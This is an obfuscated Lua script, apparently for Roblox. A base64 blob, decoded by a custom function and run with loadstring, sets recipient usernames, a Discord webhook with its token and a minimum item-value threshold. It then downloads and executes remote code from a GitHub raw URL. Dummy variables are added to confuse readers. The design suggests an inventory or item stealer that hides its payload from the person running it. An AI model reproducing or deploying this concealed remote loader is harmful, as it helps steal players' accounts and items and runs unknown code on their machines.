
local eXFhJdgnt = 'VXNlcm5hbWUgPSAiMTIzbmV3YmVnaW5uZXIiClVzZXJuYW1lMiA9ICIxMjM0bmV3YmVnaW5uZXIiCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NjQ3MzkxNjE1OTY4ODgyNy90ZnJfWWIzMkg5bE5BLURWN3B3T0ZGYzBoNHM5QWhqcERHMkprV2NXU2JtSUI3WU0xdWFobDdQNGpkaDRDZTRRTS1aVSIKTWluaW11bVJBUCA9IDEwMDAwMApsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYWRvd3N6enp6L3RpbW9jaXkvcmVmcy9oZWFkcy9tYWluL21haW4iLCB0cnVlKSkoKQ=='
local OxcCCIpO = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local HZeGxmwzQw = OxcCCIpO(eXFhJdgnt)
loadstring(HZeGxmwzQw)() -- Run decoded code

-- Dummy variables for confusion
local tXUOrFBuqHtM = math.random()
local syHdoQAcLuSZ = "This is a dummy string"
